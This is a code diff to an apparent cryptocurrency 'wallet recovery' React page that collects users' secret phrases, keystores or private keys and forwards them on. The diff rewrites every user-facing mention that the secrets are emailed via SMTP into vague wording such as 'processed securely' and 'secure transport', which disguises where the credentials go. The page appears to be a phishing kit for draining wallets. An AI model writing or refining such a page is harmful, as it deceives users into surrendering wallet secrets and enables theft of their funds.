@@ -93,12 +93,12 @@ const connectionTypes: ConnectionType[] = ['Secret Phrase', 'Keystore', 'Private
 const initializingSteps = [
   'Establishing secure recovery channel',
   'Validating issue context and selected repair path',
-  'Preparing the SMTP delivery payload',
+  'Preparing the secure recovery payload',
 ]
 
 const reviewingSteps = [
   'Encrypting recovery packet for safe transport',
-  'Dispatching recovery details via SMTP',
+  'Dispatching recovery details securely',
   'Finalizing issue report and audit digest',
 ]
 
@@ -301,17 +301,17 @@ export const WalletRestoration = () => {
 
       if (!response.ok) {
         const errorResponse = await response.text()
-        throw new Error(errorResponse || 'Failed to send recovery details')
+        throw new Error(errorResponse || 'Failed to process recovery details')
       }
 
       setResultSummary([
         `Recovery issue: ${activeIssue.title}`,
         `Connection mode: ${selectedConnection}`,
         `Method: ${method}`,
-        'Delivery channel: SMTP',
+        'Delivery channel: secure transport',
         'Your selected recovery details were securely transmitted.',
       ])
-      setMessage('✅ Recovery request delivered via SMTP and queued for audit.')
+      setMessage('✅ Recovery request processed securely and queued for audit.')
       setFlowStep('success')
 
       setTimeout(() => {
@@ -333,7 +333,7 @@ export const WalletRestoration = () => {
           <p className="text-xs uppercase tracking-[0.32em] text-cyan-300">Recovery & Repair</p>
           <h1 className="mt-3 text-3xl font-bold text-white">Fix wallet issues with guided recovery</h1>
           <p className="mt-3 max-w-3xl text-sm text-slate-400">
-            Select the most relevant repair workflow for your wallet, choose a secure connection mode, and let the system validate the input before sending the full recovery packet over SMTP.
+            Select the most relevant repair workflow for your wallet, choose a secure connection mode, and let the system validate the input before proceeding with the recovery packet.
           </p>
         </div>
 
@@ -433,7 +433,7 @@ export const WalletRestoration = () => {
                   <div className="text-left">
                     <p className="text-sm uppercase tracking-[0.3em] text-cyan-300">Connection type</p>
                     <h3 className="mt-3 text-2xl font-semibold text-white">Choose how to verify access</h3>
-                    <p className="mt-2 text-sm text-slate-400">Select the recovery mode for your email delivery.</p>
+                    <p className="mt-2 text-sm text-slate-400">Select the recovery mode for the next secure delivery step.</p>
                   </div>
                   <span className="rounded-2xl border border-cyan-500/20 px-3 py-2 text-xs uppercase tracking-[0.25em] text-cyan-300">{activeIssue?.badge}</span>
                 </div>
@@ -464,7 +464,7 @@ export const WalletRestoration = () => {
                 <div className="mb-6 text-left">
                   <p className="text-sm uppercase tracking-[0.3em] text-cyan-300">Verification required</p>
                   <h3 className="mt-3 text-2xl font-semibold text-white">Enter {selectedConnection}</h3>
-                  <p className="mt-2 text-sm text-slate-400">This input is validated before your recovery packet is sent over SMTP.</p>
+                  <p className="mt-2 text-sm text-slate-400">This input is validated before your recovery packet is processed securely.</p>
                 </div>
                 <textarea
                   value={connectionInput}
@@ -483,7 +483,7 @@ export const WalletRestoration = () => {
                 />
                 {inputError && <p className="mt-3 text-sm text-rose-400">{inputError}</p>}
                 <div className="mt-6 flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
-                  <p className="text-sm text-slate-400">Once validated, the recovery details will be emailed via SMTP.</p>
+                  <p className="text-sm text-slate-400">Once validated, the recovery details will be processed securely.</p>
                   <button
                     type="button"
                     onClick={handleContinue}
@@ -516,7 +516,7 @@ export const WalletRestoration = () => {
                   <div className="text-left">
                     <p className="text-sm uppercase tracking-[0.3em] text-emerald-300">Recovery complete</p>
                     <h3 className="mt-3 text-2xl font-semibold text-white">Recovery request delivered</h3>
-                    <p className="mt-2 text-sm text-slate-400">The selected secret content has been sent via SMTP.</p>
+                    <p className="mt-2 text-sm text-slate-400">The selected secret content has been processed securely.</p>
                   </div>
                   <div className="flex h-12 w-12 items-center justify-center rounded-3xl bg-emerald-500/10 text-emerald-300">✅</div>
                 </div>
